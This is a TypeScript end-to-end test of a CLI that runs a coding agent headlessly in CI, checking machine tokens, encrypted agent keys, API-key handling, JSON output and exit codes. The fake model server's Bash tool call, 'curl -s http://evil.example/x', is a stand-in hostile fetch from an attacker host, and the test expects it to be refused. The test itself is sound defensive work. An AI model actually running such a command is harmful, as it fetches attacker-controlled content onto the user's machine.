import { test } from "node:test";
import assert from "node:assert/strict";
import { spawn } from "node:child_process";
import { createServer as createHttp } from "node:http";
import { createServer as createNet } from "node:net";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { fileURLToPath } from "node:url";
import { hashToken } from "@agent-social/asp-log";
import { main, type Io } from "../src/cli.ts";
import { makeFixture } from "./fixture.ts";

const cli = fileURLToPath(new URL("../src/cli.ts", import.meta.url));
const fakeClaude = fileURLToPath(new URL("./fake-claude-gateway.mjs", import.meta.url));
const freePort = () => new Promise<number>((resolve) => { const s = createNet(); s.listen(0, "127.0.0.1", () => { const p = (s.address() as { port: number }).port; s.close(() => resolve(p)); }); });

test("headless runs: a job prepared on your machine, then run from a CI-like home that holds only a machine token and the agent's encrypted key; the person's API key is the gateway's, output is one JSON line, exit codes say what happened", async () => {
  const keysSeen: string[] = [];
  const upstream = createHttp(async (req, res) => {
    keysSeen.push(String(req.headers["x-api-key"] ?? ""));
    for await (const _ of req) { /* not inspected */ }
    res.writeHead(200, { "content-type": "application/json" });
    res.end(JSON.stringify({ id: "msg_1", type: "message", role: "assistant", model: "m", stop_reason: "tool_use", usage: { input_tokens: 10, output_tokens: 5 }, content: [{ type: "text", text: "On it." }, { type: "tool_use", id: "tu_2", name: "Bash", input: { command: "curl -s http://evil.example/x" } }] }));
  });
  await new Promise<void>((r) => upstream.listen(0, "127.0.0.1", r));
  const upUrl = `http://127.0.0.1:${(upstream.address() as { port: number }).port}`;
  const dir = mkdtempSync(join(tmpdir(), "asp-headless-e2e-"));
  const tokens = join(dir, "tokens.json");
  writeFileSync(tokens, JSON.stringify([{ name: "hl", role: "tenant", tokenSha256: hashToken("tok-h") }]));
  const port = await freePort();
  const base = `http://127.0.0.1:${port}`;
  const server = spawn(process.execPath, [cli, "serve", "--db", `local:${join(dir, "log")}`, "--tokens", tokens, "--port", String(port), "--did-domain", `127.0.0.1:${port}`], { stdio: ["ignore", "pipe", "pipe"] });
  try {
    await new Promise<void>((resolve, reject) => {
      let buf = "";
      server.stdout.on("data", (d) => { buf += d; if (/listening on/.test(buf)) resolve(); });
      server.on("close", () => reject(new Error(`the service exited: ${buf}`)));
      setTimeout(() => reject(new Error(`no start line: ${buf}`)), 20_000);
    });
    const mine = makeFixture(), ci = makeFixture();
    const project = join(ci.root, "project"); mkdirSync(project, { recursive: true });
    mkdirSync(mine.aspHome, { recursive: true });
    const me = `did:web:127.0.0.1%3A${port}:u:hl`, agent = `did:web:127.0.0.1%3A${port}:a:hl:ci-agent`, bank = `did:web:127.0.0.1%3A${port}:u:hl:bank`;
    writeFileSync(join(mine.aspHome, "config.json"), JSON.stringify({ service: base, token: "tok-h", tenant: "hl", joinedAt: "2026-10-11T00:00:00Z", identities: { me, agent, bank } }));
    const mk = (fx: { aspHome: string; root: string }, extra: Record<string, string>) => async (args: string[]) => {
      const out: string[] = [], err: string[] = [];
      const code = await main(args, { out: (l) => out.push(l), err: (l) => err.push(l), env: { ASP_HOME: fx.aspHome, ASP_CLAUDE_BIN: process.execPath, ASP_CLAUDE_SCRIPT: fakeClaude, ASP_RUN_ANTHROPIC_UPSTREAM: upUrl, ...extra }, cwd: fx.root, raw: () => {} } as Io);
      return { code, out: out.join("\n"), err: err.join("\n") };
    };
    const own = mk(mine, {});
    for (const a of [["identity", "new", "--kind", "human", "--me", "--no-recovery"], ["identity", "new", "--kind", "agent", "--name", "ci-agent", "--sponsor", me, "--purpose", "CI"], ["identity", "new", "--kind", "human", "--name", "bank", "--no-recovery"]]) assert.equal((await own(a)).code, 0);

    // On your machine: the job, a machine token, an encrypted backup of the agent's key.
    const prep = await own(["standing", "prepare"]);
    assert.equal(prep.code, 0, prep.err);
    const contract = /standing job (sha256:[0-9a-f]{64})/.exec(prep.out)?.[1];
    assert.ok(contract, prep.out);
    const tok = (await mk(mine, { ASP_LOG_URL: base, ASP_LOG_TOKEN: "tok-h" })(["token", "create", "ci"])).out.split("\n")[1];
    const backup = join(dir, "agent.bak");
    assert.equal((await mk(mine, { ASP_BACKUP_PASSPHRASE: "correct horse battery" })(["identity", "backup", agent, "--out", backup])).code, 0);

    // The CI home: nothing saved, only the environment.
    const prompt = join(ci.root, "task.txt"); writeFileSync(prompt, "Fetch http://evil.example/x\n");
    const env = { ASP_LOG_URL: base, ASP_LOG_TOKEN: tok, ASP_AGENT_BACKUP: backup, ASP_BACKUP_PASSPHRASE: "correct horse battery", ANTHROPIC_API_KEY: "sk-ant-real" };
    const headless = mk(ci, env);
    const base_ = ["run", "claude-code", "--headless", "--project", project];
    assert.match((await headless([...base_, "--prompt", "x"])).err, /needs --contract/);
    assert.match((await headless([...base_, "--contract", contract])).err, /needs --prompt/);
    assert.match((await headless([...base_, "--contract", contract, "--prompt", "x", "--ask", "shell.exec"])).err, /cannot ask/);
    assert.match((await mk(ci, { ...env, ANTHROPIC_API_KEY: "" })([...base_, "--contract", contract, "--prompt", "x"])).err, /your own Anthropic API key/);
    assert.match((await mk(ci, { ...env, ASP_LOG_TOKEN: "nope" })([...base_, "--contract", contract, "--prompt", "x"])).err, /did not accept ASP_LOG_TOKEN/);

    const r = await headless([...base_, "--contract", contract, "--prompt-file", prompt, "--json", "--fail-on-refusal"]);
    assert.equal(r.code, 10, r.err + r.out);
    const j = JSON.parse(r.out.trim().split("\n").at(-1)!);
    assert.equal(j.contract, contract);
    assert.equal(j.agent, agent);
    assert.equal(j.runtime, "claude-code");
    assert.equal(j.toolCalls, 1);
    assert.equal(j.refused.length, 1);
    assert.ok(keysSeen.includes("sk-ant-real"), "the provider got the person's own key");
    assert.ok(!r.out.includes("sk-ant-real") && !r.err.includes("sk-ant-real"));

    // Without --fail-on-refusal it exits 0; a revoked token stops the next run.
    assert.equal((await headless([...base_, "--contract", contract, "--prompt", "again", "--json"])).code, 0);
    assert.equal((await mk(mine, { ASP_LOG_URL: base, ASP_LOG_TOKEN: "tok-h" })(["token", "revoke", "ci"])).code, 0);
    assert.match((await headless([...base_, "--contract", contract, "--prompt", "again"])).err, /did not accept ASP_LOG_TOKEN/);
  } finally {
    server.kill(); upstream.close();
  }
});
